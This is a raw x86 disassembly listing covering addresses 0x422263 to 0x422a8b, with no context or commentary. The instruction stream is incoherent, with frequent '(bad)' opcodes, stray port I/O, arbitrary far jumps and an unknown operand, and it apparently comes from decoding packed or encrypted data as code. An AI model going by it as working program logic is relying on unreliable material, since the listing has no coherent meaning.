  422263:	xchg   BYTE PTR [eax-0x1e],dl
  422266:	xchg   ebx,eax
  422267:	mov    eax,0xe43a04b0
  42226c:	hlt    
  42226d:	cmp    ebp,DWORD PTR [ecx+eiz*2+0x4d]
  422271:	mov    ah,0x7b
  422273:	popf   
  422274:	add    al,0x79
  422276:	pop    eax
  422277:	aas    
  422278:	cmc    
  422279:	(bad)  
  42227b:	gs out 0x66,eax
  42227e:	pop    es
  42227f:	ss in  al,dx
  422281:	js     0x4222c5
  422283:	ins    DWORD PTR es:[edi],dx
  422284:	fimul  WORD PTR [ebx+0x2d5bb3a2]
  42228a:	pop    es
  42228b:	and    BYTE PTR [ecx],dh
  42228d:	mov    ch,0x78
  42228f:	jae    0x422258
  422291:	std    
  422292:	pop    edx
  422293:	jnp    0x4222e9
  422295:	or     esi,ebp
  422297:	mov    ecx,0x56a76ef8
  42229c:	stos   DWORD PTR es:[edi],eax
  42229d:	clc    
  42229e:	test   BYTE PTR [esi-0x6bf9dc40],ch
  4222a4:	out    0x3e,al
  4222a6:	lods   eax,DWORD PTR ds:[esi]
  4222a7:	mov    esp,0xe69a539
  4222ac:	arpl   WORD PTR [ebx],bp
  4222ae:	data16 aas 
  4222b0:	mov    dl,0x68
  4222b2:	(bad)  
  4222b3:	imul   eax,DWORD PTR [ebp+0x40],0xdf64a08d
  4222ba:	inc    esp
  4222bb:	xlat   BYTE PTR ds:[ebx]
  4222bc:	fidivr WORD PTR [edi-0x2d]
  4222bf:	lock add eax,0xd945850c
  4222c5:	in     al,dx
  4222c6:	fwait
  4222c7:	rol    BYTE PTR [edi+0x18],1
  4222ca:	jl     0x42225b
  4222cc:	retf   
  4222cd:	ins    WORD PTR es:[edi],dx
  4222cf:	(bad)  
  4222d0:	in     al,dx
  4222d1:	jnp    0x422298
  4222d3:	pop    ebp
  4222d4:	mov    bl,0x90
  4222d6:	fadd   DWORD PTR [eax+0x3ad5f24]
  4222dc:	les    esi,FWORD PTR [edi+eax*1+0x4f1bd9f3]
  4222e3:	shr    BYTE PTR [eax],1
  4222e5:	jne    0x422351
  4222e7:	dec    eax
  4222e8:	imul   ecx,DWORD PTR [edx+0x2c],0x43
  4222ec:	into   
  4222ed:	push   ecx
  4222ee:	sbb    al,0x25
  4222f0:	imul   ecx,DWORD PTR [ebx+0x53],0xffffff91
  4222f4:	jl     0x42233e
  4222f6:	adc    cl,BYTE PTR [eax+esi*8]
  4222f9:	add    edi,edx
  4222fb:	xor    al,0xd4
  4222fd:	fprem  
  4222ff:	mov    DWORD PTR [edx],esp
  422301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422302:	jp     0x4222ec
  422304:	cmp    al,bl
  422306:	sbb    bh,dh
  422308:	mov    dh,0x88
  42230a:	std    
  42230b:	mov    esp,DWORD PTR [eax+0x2c]
  42230e:	aam    0xdd
  422310:	neg    dl
  422312:	imul   edi,DWORD PTR [ecx-0x3ecfc324],0x28
  422319:	jno    0x4222fe
  42231b:	pop    esp
  42231c:	stos   DWORD PTR es:[edi],eax
  42231d:	xlat   BYTE PTR ds:[ebx]
  42231e:	sub    al,0x49
  422320:	outs   dx,DWORD PTR ds:[esi]
  422321:	cli    
  422322:	xor    DWORD PTR [ebx],ecx
  422324:	gs pop edi
  422326:	sub    ecx,edx
  422328:	in     eax,0xa5
  42232a:	dec    edx
  42232b:	ror    DWORD PTR [esi],cl
  42232d:	fs jecxz 0x4222b5
  422330:	ret    
  422331:	ins    DWORD PTR es:[edi],dx
  422332:	push   ebp
  422333:	fdiv   QWORD PTR [edi]
  422335:	dec    edi
  422336:	cdq    
  422337:	mov    eax,ds:0x10a074e
  42233c:	fwait
  42233d:	mov    dh,0xa3
  42233f:	das    
  422340:	cwde   
  422341:	dec    edi
  422342:	mov    WORD PTR [edi],es
  422344:	mov    es,WORD PTR [edx]
  422346:	push   edi
  422347:	mov    esi,0x43750616
  42234c:	add    ch,BYTE PTR ds:[esi]
  42234f:	fwait
  422350:	pop    edi
  422351:	rcr    DWORD PTR ds:0xc6b60f43,cl
  422357:	jl     0x42238e
  422359:	rcl    DWORD PTR [eax-0x32355b6f],cl
  42235f:	or     BYTE PTR [ecx+0xa66de5f],ah
  422365:	aas    
  422366:	xor    eax,0x5bcdd7f7
  42236b:	pop    edi
  42236c:	xor    edi,DWORD PTR [ecx+0x70]
  42236f:	jmp    0x4222f9
  422371:	inc    edx
  422372:	cmp    DWORD PTR [edx],edi
  422374:	mov    edi,0x9765cbd2
  422379:	loopne 0x422344
  42237b:	jno    0x4223bd
  42237d:	clc    
  42237e:	and    DWORD PTR [esi-0x44],ebx
  422381:	(bad)  
  422382:	jmp    DWORD PTR [eax-0x3b6d3b9e]
  422388:	jmp    0xd3e3c24f
  42238d:	cmp    dl,ah
  42238f:	loope  0x422408
  422391:	sbb    BYTE PTR [edx-0x7e519a5],0xbc
  422398:	jp     0x422396
  42239a:	test   BYTE PTR [ebx],ch
  42239c:	and    al,0x1d
  42239e:	imul   esp,DWORD PTR [edi],0xdb043f36
  4223a4:	and    eax,0x69a46f17
  4223a9:	jecxz  0x422394
  4223ab:	jae    0x4223be
  4223ad:	fwait
  4223ae:	sub    eax,0xd79713ca
  4223b3:	mov    ds:0x4136de50,al
  4223b8:	(bad)  
  4223b9:	sub    eax,0x205739cc
  4223be:	and    edi,DWORD PTR [ebx]
  4223c0:	ja     0x422396
  4223c2:	push   edx
  4223c3:	ret    0x48fb
  4223c6:	fnclex 
  4223c8:	std    
  4223c9:	std    
  4223ca:	jl     0x4223af
  4223cc:	int    0x7c
  4223ce:	mov    ebp,0x6a11edf9
  4223d3:	dec    ebp
  4223d4:	push   edx
  4223d5:	sub    edi,DWORD PTR [edx+edi*4+0x11]
  4223d9:	inc    ebp
  4223da:	push   ds
  4223db:	sub    esi,ebp
  4223dd:	stc    
  4223de:	mov    ebp,0x888428b6
  4223e3:	push   ebx
  4223e4:	mov    eax,ds:0x67a2bda6
  4223e9:	out    dx,eax
  4223ea:	ret    0xd121
  4223ed:	(bad)  
  4223ee:	push   ds
  4223ef:	sub    esp,DWORD PTR [ebp+0x360a4e6]
  4223f5:	or     BYTE PTR [ebx+ebx*4+0x4e4534b3],dh
  4223fc:	sbb    eax,0x6150517e
  422401:	jne    0x4223b6
  422403:	mov    ebx,0xb52742d2
  422408:	and    eax,0xcc486de3
  42240d:	aad    0x66
  42240f:	xchg   edx,eax
  422410:	rol    al,1
  422412:	adc    al,0xb
  422414:	dec    ebp
  422415:	mov    ecx,0xe2bd2add
  42241a:	test   DWORD PTR [edx],0x48554ddc
  422420:	xor    eax,0x632f450e
  422425:	cs sti 
  422427:	sub    BYTE PTR [eax+0x4f],al
  42242a:	dec    ecx
  42242b:	gs stos BYTE PTR es:[edi],al
  42242d:	and    BYTE PTR ds:0x4463f7be,dl
  422433:	in     eax,0x83
  422435:	jg     0x4223ba
  422437:	adc    BYTE PTR [eax-0x4ba4b524],0xad
  42243e:	mov    al,0x1c
  422440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422441:	adc    al,0x72
  422443:	and    DWORD PTR [esi+ebx*8-0x1],0xce2d825f
  42244b:	inc    ebx
  42244c:	sbb    eax,0xcf70f26c
  422451:	dec    esp
  422452:	jge    0x4224c3
  422454:	pop    ecx
  422455:	cmp    DWORD PTR [edi+0x59ef6a1c],0xffffffe8
  42245c:	iret   
  42245d:	mov    ebx,0x655e445b
  422462:	sbb    al,0x4d
  422464:	jp     0x4224d7
  422466:	lea    esp,[edx-0x2b052f21]
  42246c:	xchg   ebx,eax
  42246d:	sub    al,0x5e
  42246f:	mov    ebx,0xbf6e0feb
  422474:	cwde   
  422475:	xchg   esi,eax
  422476:	je     0x42246e
  422478:	fs adc eax,0x9dad2749
  42247e:	sar    edx,cl
  422480:	or     DWORD PTR [esi+0x6ce2ae50],esi
  422486:	cs dec edx
  422488:	stos   DWORD PTR es:[edi],eax
  422489:	or     bh,BYTE PTR [ebx-0x3d2671ec]
  42248f:	imul   ebx,DWORD PTR [edx-0x669d6547],0xffffffbc
  422496:	jmp    edx
  422498:	pop    esp
  422499:	mov    dl,0x64
  42249b:	inc    ebp
  42249c:	xor    bh,BYTE PTR [ebx-0x747bcc4c]
  4224a2:	jns    0x4224e0
  4224a4:	es add edi,edx
  4224a7:	inc    eax
  4224a8:	std    
  4224a9:	xor    al,0x75
  4224ab:	xor    al,0xf8
  4224ad:	mov    edi,0x29328718
  4224b2:	pop    ss
  4224b3:	call   0x14a13182
  4224b8:	mov    ch,0xe9
  4224ba:	scas   eax,DWORD PTR es:[edi]
  4224bb:	mov    cl,0x17
  4224bd:	mov    al,0xf3
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	mov    al,ds:0xfa94804b
  4224c5:	cdq    
  4224c6:	lods   eax,DWORD PTR ds:[esi]
  4224c7:	loope  0x4224d9
  4224c9:	addr16 loop 0x42245b
  4224cc:	push   ss
  4224cd:	push   ecx
  4224ce:	aas    
  4224cf:	ret    0x52b9
  4224d2:	jae    0x422516
  4224d4:	cmp    eax,0xfa56c3b7
  4224d9:	pushf  
  4224da:	sub    eax,0xf3bf65fd
  4224df:	jmp    0x2bdffeb2
  4224e4:	sbb    ah,al
  4224e6:	(bad)  
  4224e7:	fisubr WORD PTR [edx-0x2fe04e6a]
  4224ed:	push   esi
  4224ee:	out    dx,eax
  4224ef:	aam    0x96
  4224f1:	dec    esp
  4224f2:	inc    esp
  4224f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224f4:	xchg   ebp,eax
  4224f5:	dec    edi
  4224f6:	inc    edx
  4224f7:	fnsave [ebx+ecx*2-0x70]
  4224fb:	and    DWORD PTR [edi-0xb],0x78f96e7
  422502:	adc    esp,DWORD PTR [ebp+esi*8+0x17c3c321]
  422509:	jg     0x42253f
  42250b:	push   ebx
  42250c:	arpl   WORD PTR [edi+0x132c546e],dx
  422512:	lock fimul DWORD PTR gs:[ebx]
  422516:	jmp    0x4aa4:0x4f0fb95a
  42251d:	dec    edi
  42251e:	dec    eax
  42251f:	popf   
  422520:	cmp    BYTE PTR [edx+0x48bf7793],al
  422526:	mov    esi,0xa8e1dc03
  42252b:	sub    dh,0x23
  42252e:	inc    ebx
  42252f:	test   BYTE PTR [ebx+0x7843d9b2],0xb9
  422536:	psubq  mm4,mm7
  422539:	inc    eax
  42253a:	mov    ecx,0xe2942649
  42253f:	ret    
  422540:	into   
  422541:	data16 or dl,BYTE PTR [edi+eax*4+0x5eab15e3]
  422549:	lock dec edi
  42254b:	test   eax,0xa9c23bb5
  422550:	cld    
  422551:	mov    ecx,0xbb38c778
  422556:	sbb    cl,BYTE PTR [esi-0x61afd4f4]
  42255c:	jae    0x422538
  42255e:	mov    al,0xb9
  422560:	xchg   edi,eax
  422561:	xor    al,cl
  422563:	inc    ebx
  422564:	mov    esp,0x7d8c1783
  422569:	loopne 0x4225c7
  42256b:	scas   eax,DWORD PTR es:[edi]
  42256c:	mov    eax,ds:0x40ef1d8c
  422571:	lahf   
  422572:	or     ecx,ecx
  422574:	lock cmp BYTE PTR [esi+0x13],ch
  422578:	sbb    ah,BYTE PTR [eax]
  42257a:	xor    eax,ebx
  42257c:	xlat   BYTE PTR ds:[ebx]
  42257d:	and    cl,BYTE PTR [edi]
  42257f:	nop
  422580:	sub    edx,ecx
  422582:	fld    QWORD PTR [edi-0x79]
  422585:	xor    al,0x67
  422587:	ins    DWORD PTR es:[edi],dx
  422588:	dec    edx
  422589:	sbb    al,0xf5
  42258b:	and    edi,edi
  42258d:	mov    bh,0x53
  42258f:	(bad)  
  422591:	sbb    al,BYTE PTR [edx-0x79327af4]
  422597:	(bad)  
  422599:	jle    0x422577
  42259b:	cmp    bh,dh
  42259d:	cmp    al,0xf2
  42259f:	fdiv   QWORD PTR [ebx+0x70]
  4225a2:	pop    edx
  4225a3:	or     DWORD PTR [ebp-0x7afd1a],ebx
  4225a9:	shl    DWORD PTR [eax+edx*1+0x4d],cl
  4225ad:	in     al,dx
  4225ae:	cmp    ah,bl
  4225b0:	pop    ecx
  4225b1:	cli    
  4225b2:	retf   0x243d
  4225b5:	in     al,0x77
  4225b7:	fs cmp eax,0x25375d5b
  4225bd:	enter  0x7bbf,0x8d
  4225c1:	lea    esp,[edi]
  4225c3:	lds    eax,FWORD PTR [ebx+0x58e2b738]
  4225c9:	ds imul edx,esp,0x30
  4225cd:	jmp    0x96d3:0xf73fccc3
  4225d4:	sub    edi,esi
  4225d6:	test   BYTE PTR [ebp+0x4f822464],cl
  4225dc:	pop    eax
  4225dd:	and    esi,ebp
  4225df:	cmp    DWORD PTR [eax],ebp
  4225e1:	dec    ebx
  4225e2:	je     0x422630
  4225e4:	push   ebp
  4225e5:	and    eax,0xba0c5c5f
  4225ea:	dec    edx
  4225eb:	mov    dh,BYTE PTR [ebx-0x62]
  4225ee:	pop    ecx
  4225ef:	inc    edi
  4225f0:	inc    ebp
  4225f1:	jg     0x422585
  4225f3:	mov    esi,edi
  4225f5:	ret    0xc9b9
  4225f8:	cmp    eax,0x244babd0
  4225fd:	fdiv   st,st(3)
  4225ff:	mov    edi,0x92ea8b2f
  422604:	pop    esp
  422605:	sbb    BYTE PTR [esi+0x75],bl
  422608:	fcomp  DWORD PTR [edx]
  42260a:	mov    ebp,0xb0d9d20d
  42260f:	adc    DWORD PTR [eax],ebp
  422611:	jns    0x422665
  422613:	add    BYTE PTR [eax+0x24],al
  422616:	stos   DWORD PTR es:[edi],eax
  422617:	stc    
  422618:	mov    edi,0x1a2f9fec
  42261d:	push   cs
  42261e:	aaa    
  42261f:	inc    ecx
  422620:	cmp    esi,ebp
  422622:	loopne 0x42260c
  422624:	loopne 0x4225c5
  422626:	mov    dh,0xd7
  422628:	or     BYTE PTR [ecx+0x1c8e2129],cl
  42262e:	add    DWORD PTR [eax+esi*4+0x68],0x69
  422633:	and    DWORD PTR [ebx-0x21],ecx
  422636:	mov    esp,0x1d69be45
  42263b:	add    BYTE PTR ds:0x848e21f9,al
  422641:	pop    ebp
  422642:	xor    eax,0x7167ce27
  422647:	push   ds
  422648:	outs   dx,DWORD PTR ds:[esi]
  422649:	xor    BYTE PTR [edx],bh
  42264b:	cmp    eax,0x3b9f12d4
  422650:	je     0x422667
  422652:	or     DWORD PTR [ebx+eiz*1-0x66],ebp
  422656:	pop    ds
  422657:	or     bl,BYTE PTR [edx-0x126cc9c]
  42265d:	retf   0x919d
  422660:	add    DWORD PTR [esi+esi*4-0x2414bca],0xffffffcf
  422668:	xor    BYTE PTR [esi],cl
  42266a:	pop    ebx
  42266b:	popa   
  42266c:	aaa    
  42266d:	test   DWORD PTR [ebx-0xc],edx
  422670:	pop    ds
  422671:	cwde   
  422672:	dec    eax
  422673:	imul   BYTE PTR [edi+0x76]
  422676:	ror    edi,cl
  422678:	shl    bl,0x94
  42267b:	in     eax,0x96
  42267d:	jnp    0x422684
  42267f:	adc    esi,DWORD PTR [ebp+0x49]
  422682:	neg    DWORD PTR ds:0x9d74af7e
  422688:	rcl    DWORD PTR [edx+0x62424669],cl
  42268e:	aaa    
  42268f:	mov    edi,0x1cdfb814
  422694:	jns    0x422688
  422696:	(bad)  
  422697:	test   eax,0x1c411363
  42269c:	push   esp
  42269d:	mov    ah,0x10
  42269f:	sbb    eax,0xf7052395
  4226a4:	scas   al,BYTE PTR es:[edi]
  4226a5:	add    al,0x35
  4226a7:	xchg   bh,cl
  4226a9:	xchg   esp,eax
  4226aa:	pop    ds
  4226ab:	cmp    al,0x5d
  4226ad:	and    al,0xed
  4226af:	icebp  
  4226b0:	les    ebx,FWORD PTR [ecx]
  4226b2:	inc    eax
  4226b3:	jl     0x42268c
  4226b5:	dec    esi
  4226b6:	test   DWORD PTR [ebp+0x4837904a],ebx
  4226bc:	and    bl,0xf8
  4226bf:	shl    DWORD PTR [ebx],0x63
  4226c2:	mov    al,0xaa
  4226c4:	mov    edi,0x2b3d4c95
  4226c9:	nop
  4226ca:	xchg   esp,eax
  4226cb:	fstp   st(4)
  4226cd:	in     eax,0x7a
  4226cf:	std    
  4226d0:	xchg   ebx,eax
  4226d1:	push   ecx
  4226d2:	pop    ss
  4226d3:	cmp    esi,DWORD PTR ds:0x1325eae6
  4226d9:	aaa    
  4226da:	cmp    DWORD PTR [si+0x6cc9],0xc09a5578
  4226e3:	jbe    0x4226dd
  4226e5:	imul   BYTE PTR ds:0x40d95cb
  4226eb:	xor    ch,0xac
  4226ee:	mov    cl,0x16
  4226f0:	adc    DWORD PTR [edx],edi
  4226f2:	lods   eax,DWORD PTR ds:[esi]
  4226f3:	xchg   al,ch
  4226f5:	mov    bl,0x8
  4226f7:	inc    esp
  4226f8:	inc    ecx
  4226f9:	xlat   BYTE PTR ds:[ebx]
  4226fa:	sub    bh,BYTE PTR [eax]
  4226fc:	cdq    
  4226fd:	hlt    
  4226fe:	(bad)  
  4226ff:	loopne 0x422773
  422701:	mov    ds:0x6400e2ca,eax
  422706:	jnp    0x422720
  422708:	pop    ds
  422709:	fsub   DWORD PTR [edx+0x33]
  42270c:	jp     0x422782
  42270e:	std    
  42270f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422710:	scas   al,BYTE PTR es:[edi]
  422711:	adc    DWORD PTR [edx+0x11],0x7cf8d158
  422718:	ficom  WORD PTR [ecx+eiz*8]
  42271b:	enter  0x5c8d,0x2f
  42271f:	adc    DWORD PTR [esi+0x5f],0x47
  422723:	lods   eax,DWORD PTR ds:[esi]
  422724:	jb     0x42270d
  422726:	ins    BYTE PTR es:[edi],dx
  422727:	jecxz  0x42279f
  422729:	nop
  42272a:	ss push ds
  42272c:	ja     0x42279a
  42272e:	arpl   ax,dx
  422730:	idiv   BYTE PTR [esi]
  422732:	xor    bl,al
  422734:	test   BYTE PTR [edx-0x61d61d20],ah
  42273a:	rcr    ch,1
  42273c:	repnz shr DWORD PTR [ebx+0x79438a8d],0x3c
  422744:	ins    DWORD PTR es:[edi],dx
  422745:	fwait
  422746:	xchg   BYTE PTR [ebp+0x75],ah
  422749:	inc    ebx
  42274a:	loope  0x42271e
  42274c:	jo     0x42279b
  42274e:	adc    ch,dh
  422750:	sahf   
  422751:	or     BYTE PTR [ecx-0x58376bd8],bh
  422757:	xchg   BYTE PTR [ecx-0x2631e118],al
  42275d:	retf   0xbc7b
  422760:	sbb    eax,0xd670a089
  422765:	pop    esp
  422766:	xchg   esp,eax
  422767:	lahf   
  422768:	xchg   esi,eax
  422769:	mov    WORD PTR [ebp+0x196bba01],gs
  42276f:	add    DWORD PTR [edi-0x18ad3784],ebp
  422775:	add    eax,DWORD PTR [esi-0x3d455b8d]
  42277b:	add    al,0xcf
  42277d:	je     0x42277f
  42277f:	sub    DWORD PTR [edi-0x2f8f90e4],esp
  422785:	add    esp,edi
  422787:	mov    eax,ds:0x2fe414bc
  42278c:	call   0x225231c4
  422791:	mov    ebx,0xff7316ad
  422796:	sbb    BYTE PTR [ebp-0x235eba22],al
  42279c:	aas    
  42279d:	lahf   
  42279e:	rol    BYTE PTR [eax],0x8a
  4227a1:	or     BYTE PTR [ebp+0x28cba790],dl
  4227a7:	mov    ds:0xbc39b42e,al
  4227ac:	xchg   ecx,eax
  4227ad:	xor    ebp,DWORD PTR [edi+0x29335936]
  4227b3:	ret    0x5d38
  4227b6:	int    0xb2
  4227b8:	shr    BYTE PTR [ecx+0x24352c85],cl
  4227be:	jo     0x4227ec
  4227c0:	aad    0x5a
  4227c2:	out    0xa,eax
  4227c4:	jae    0x42276e
  4227c6:	sbb    BYTE PTR [eax+0x55],dh
  4227c9:	push   edx
  4227ca:	xor    BYTE PTR es:[ebp+0x100a32f8],ah
  4227d1:	push   edx
  4227d2:	les    edi,FWORD PTR [ebx+0x2b143a4c]
  4227d8:	data16 xor BYTE PTR ds:0xe3739c51,bh
  4227df:	fimul  WORD PTR [eax-0x54]
  4227e2:	push   ss
  4227e3:	scas   al,BYTE PTR es:[edi]
  4227e4:	fld    QWORD PTR [ebx]
  4227e6:	jecxz  0x422813
  4227e8:	sbb    al,0x96
  4227ea:	push   0xb54d2605
  4227ef:	xor    dl,BYTE PTR [edi-0x74]
  4227f2:	cmp    BYTE PTR [ecx-0x39],al
  4227f5:	gs jno 0x4227a6
  4227f8:	pushf  
  4227f9:	jg     0x42284c
  4227fb:	lahf   
  4227fc:	cmp    BYTE PTR [ebx-0x7],ah
  4227ff:	pushf  
  422800:	jl     0x42283c
  422802:	loope  0x4227b4
  422804:	push   eax
  422805:	sub    al,0xd9
  422807:	imul   dh
  422809:	adc    BYTE PTR [esi-0x305dc2c0],ah
  42280f:	mov    bh,0x6a
  422811:	jns    0x4227a6
  422813:	call   FWORD PTR [edx-0x64adddf]
  422819:	and    al,0xa9
  42281b:	inc    esp
  42281c:	xlat   BYTE PTR ds:[ebx]
  42281d:	fsubr  QWORD PTR [edi]
  42281f:	iret   
  422820:	adc    DWORD PTR [edi-0x26],0xffffffc4
  422824:	mov    al,0xcc
  422826:	dec    edi
  422827:	pop    ebp
  422828:	ret    
  422829:	ja     0x42287a
  42282b:	adc    al,0x97
  42282d:	repz inc esp
  42282f:	jnp    0x42283a
  422831:	xchg   ebx,eax
  422832:	gs jno 0x422879
  422835:	xlat   BYTE PTR ds:[ebx]
  422836:	(bad)  
  422837:	xlat   BYTE PTR ds:[ebx]
  422838:	pop    edi
  422839:	fsubrp st(6),st
  42283b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42283c:	pop    ss
  42283d:	and    eax,0x271d274
  422842:	xchg   ebx,eax
  422843:	lea    esp,[edx+0x15]
  422846:	mov    al,ds:0x95ef009d
  42284b:	jge    0x422869
  42284d:	mov    al,ds:0xa093abd0
  422852:	mov    esi,0xf1357af7
  422857:	stos   BYTE PTR es:[edi],al
  422858:	dec    esi
  422859:	gs xchg ebx,eax
  42285b:	or     DWORD PTR [edi+0x6cc12398],0x2f
  422862:	inc    ebx
  422863:	jns    0x4228a0
  422865:	jne    0x4227ef
  422867:	(bad)  
  422869:	inc    esp
  42286a:	xchg   esp,eax
  42286b:	and    eax,0x24cc15f3
  422870:	inc    edi
  422871:	mov    bl,0x66
  422873:	mov    ?,ecx
  422875:	fs fucomip st,st(6)
  422878:	addr16 inc ebp
  42287a:	adc    BYTE PTR [eax+ecx*1-0x22793935],bl
  422881:	cmp    esp,eax
  422883:	cwde   
  422884:	loope  0x42281a
  422886:	gs aaa 
  422888:	fldcw  WORD PTR [edi-0x2976715]
  42288e:	sbb    DWORD PTR [esi+0x4acc9562],0xffffffd1
  422895:	addr16 jge 0x4228c6
  422898:	ror    DWORD PTR ds:0x94d32fc,cl
  42289e:	mov    gs,WORD PTR [edi+0x8]
  4228a1:	jmp    0x5137:0x89ffd08d
  4228a8:	mov    ah,0xa3
  4228aa:	lods   eax,DWORD PTR ds:[esi]
  4228ab:	cmp    DWORD PTR [edx-0x4830175],eax
  4228b1:	push   ss
  4228b2:	div    BYTE PTR [bx+di]
  4228b5:	jle    0x4228aa
  4228b7:	xor    eax,0x3c70de18
  4228bc:	xchg   esp,eax
  4228bd:	pop    eax
  4228be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228bf:	es push ecx
  4228c1:	sbb    esp,DWORD PTR ds:0x4f09140f
  4228c7:	pushf  
  4228c8:	fsubr  QWORD PTR [esi+0x3c527118]
  4228ce:	dec    eax
  4228cf:	xor    dl,BYTE PTR [edi-0x6b]
  4228d2:	jb     0x422916
  4228d4:	xlat   BYTE PTR ds:[ebx]
  4228d5:	lods   al,BYTE PTR ds:[esi]
  4228d6:	ret    0x5c38
  4228d9:	retf   0x8ff2
  4228dc:	imul   esi,DWORD PTR [edx],0x1f415fc9
  4228e2:	jo     0x4228f7
  4228e4:	xor    al,0xf9
  4228e6:	push   0xfffffffd
  4228e8:	retf   0xd47c
  4228eb:	dec    ebx
  4228ec:	ja     0x42293c
  4228ee:	bound  ecx,QWORD PTR [eax]
  4228f0:	sub    dh,BYTE PTR [ebx]
  4228f2:	arpl   sp,bx
  4228f4:	cmp    DWORD PTR [edx-0x79],0x11
  4228f8:	retf   
  4228f9:	std    
  4228fa:	xor    eax,DWORD PTR [edi+0x6b]
  4228fd:	ins    BYTE PTR es:[edi],dx
  4228fe:	stc    
  4228ff:	mov    dl,0x63
  422901:	mov    ds:0x3ed9d43,al
  422906:	stc    
  422907:	test   BYTE PTR [ecx],al
  422909:	test   eax,0x72898675
  42290e:	jmp    0x382f:0x730d8e53
  422915:	mov    cl,al
  422917:	adc    ah,BYTE PTR [edi+edx*1]
  42291a:	cmp    BYTE PTR [ecx-0x3d],ah
  42291d:	adc    eax,0x36e9f0b3
  422922:	and    edi,ecx
  422924:	jnp    0x42292e
  422926:	out    0x23,eax
  422928:	mov    ch,0x1a
  42292a:	repz sub edi,eax
  42292d:	inc    edx
  42292e:	dec    ecx
  42292f:	clc    
  422930:	push   ds
  422931:	fldcw  WORD PTR [edx+ecx*4+0x26]
  422935:	les    ebx,FWORD PTR [esi]
  422937:	jo     0x4228f4
  422939:	jmp    0xc85c:0xfc8eefeb
  422940:	rcr    DWORD PTR [edi+0x40],cl
  422943:	adc    ecx,ecx
  422945:	pop    ss
  422946:	call   0xc4e6:0xaa37190
  42294d:	sbb    eax,0x59e2c3bf
  422952:	mov    ds:0xf8c10513,al
  422957:	frstor [ebp-0x2d67dc19]
  42295d:	mov    al,ds:0xf9c44568
  422962:	mov    ah,0x74
  422964:	jbe    0x422974
  422966:	mov    esi,0xbc905dce
  42296b:	pusha  
  42296c:	push   ss
  42296d:	in     al,0x4f
  42296f:	(bad)  
  422970:	cmc    
  422971:	mov    al,0xd8
  422973:	mov    ch,0x9
  422975:	fisub  WORD PTR [edx+0x1c]
  422978:	push   ss
  422979:	sub    al,0x44
  42297b:	push   0x76eb067e
  422980:	add    eax,DWORD PTR [esi-0x6df6fce3]
  422986:	or     BYTE PTR [edi],0xb5
  422989:	push   ebp
  42298a:	push   eax
  42298b:	test   al,0xcf
  42298d:	cmp    DWORD PTR [ebp+ecx*2+0x60],0x37
  422992:	sbb    BYTE PTR [eax],dl
  422994:	xchg   ah,bl
  422996:	sub    BYTE PTR [ebx+eiz*8+0x4b0b223e],dl
  42299d:	nop
  42299e:	daa    
  42299f:	cld    
  4229a0:	xchg   edi,eax
  4229a1:	or     eax,0xb5db7259
  4229a6:	ret    0xe620
  4229a9:	dec    esp
  4229aa:	add    BYTE PTR [esi],0x7e
  4229ad:	ds mov ecx,0x7ea9bd36
  4229b3:	jbe    0x42298b
  4229b5:	push   0x68be397b
  4229ba:	hlt    
  4229bb:	pop    ebx
  4229bc:	push   ebp
  4229bd:	xchg   esi,eax
  4229be:	add    BYTE PTR [ecx-0x110567a1],bh
  4229c4:	cmp    ebp,DWORD PTR [esi+0x323a9295]
  4229ca:	xor    DWORD PTR [edx],edi
  4229cc:	nop
  4229cd:	xor    DWORD PTR [ebx+0x21],edi
  4229d0:	ret    0xe91d
  4229d3:	repz shl DWORD PTR [esi-0x73],0xae
  4229d8:	or     BYTE PTR [edi+ecx*8],al
  4229db:	aam    0x73
  4229dd:	fist   DWORD PTR [ebx+0x7c]
  4229e0:	push   edx
  4229e1:	pop    ds
  4229e2:	adc    esp,ebx
  4229e4:	mov    esi,0x4829a4fb
  4229e9:	sti    
  4229ea:	and    BYTE PTR [edi+0xcc8cdfb],dh
  4229f0:	stos   BYTE PTR es:[edi],al
  4229f1:	into   
  4229f2:	or     esp,DWORD PTR [esi+0x3e]
  4229f5:	les    edx,FWORD PTR [ecx+0x7a1bfaec]
  4229fb:	lds    ebp,FWORD PTR [eax+0x76283302]
  422a01:	inc    esi
  422a02:	arpl   WORD PTR [esi+0x4d],ax
  422a05:	hlt    
  422a06:	pusha  
  422a07:	and    eax,0x58809ce2
  422a0c:	push   esi
  422a0d:	das    
  422a0e:	mov    eax,0x9b4f9eb3
  422a13:	dec    ebp
  422a14:	dec    edi
  422a15:	icebp  
  422a16:	fwait
  422a17:	pusha  
  422a18:	mov    ecx,0xdda1c5da
  422a1d:	popa   
  422a1e:	ja     0x422a97
  422a20:	cmp    bl,BYTE PTR [edx-0x2a6435ab]
  422a26:	jae    0x422a0b
  422a28:	jne    0x4229d5
  422a2a:	inc    esp
  422a2b:	inc    esi
  422a2c:	jge    0x422a2e
  422a2e:	sub    eax,0x2d3f804d
  422a33:	retf   0x5c43
  422a36:	in     al,dx
  422a37:	push   ds
  422a38:	dec    edx
  422a39:	mov    dl,0xba
  422a3b:	sahf   
  422a3c:	xchg   eax,edi
  422a3e:	cmp    eax,0xbecf4503
  422a43:	es stos DWORD PTR es:[edi],eax
  422a45:	xor    cl,dl
  422a47:	add    al,0xae
  422a49:	pop    ecx
  422a4a:	mov    eax,ds:0x5293f303
  422a4f:	(bad)  
  422a50:	frstor [ecx+edx*2+0x53]
  422a54:	loopne 0x422a15
  422a56:	adc    dl,ch
  422a58:	ins    DWORD PTR es:[edi],dx
  422a59:	fscale 
  422a5b:	pushf  
  422a5c:	cmp    BYTE PTR [ebx-0x2e],cl
  422a5f:	mov    eax,0x43ff785e
  422a64:	cdq    
  422a65:	jle    0x4229fd
  422a67:	or     edi,DWORD PTR ds:0x9399a77
  422a6d:	stos   DWORD PTR es:[edi],eax
  422a6e:	fdivr  DWORD PTR [edx+edi*4]
  422a71:	cmp    esi,DWORD PTR [eax+0x27]
  422a74:	inc    ecx
  422a75:	adc    eax,0x8f3e3def
  422a7a:	jb     0x422acb
  422a7c:	and    eax,0xd360a9e7
  422a81:	mov    esp,0x4d03266d
  422a86:	cmp    DWORD PTR [ecx+ebp*1-0x5d],ebp
  422a8a:	(bad)  
  422a8b:	adc    DWORD PTR [eax+eax*2-0xc54ee1d],eax
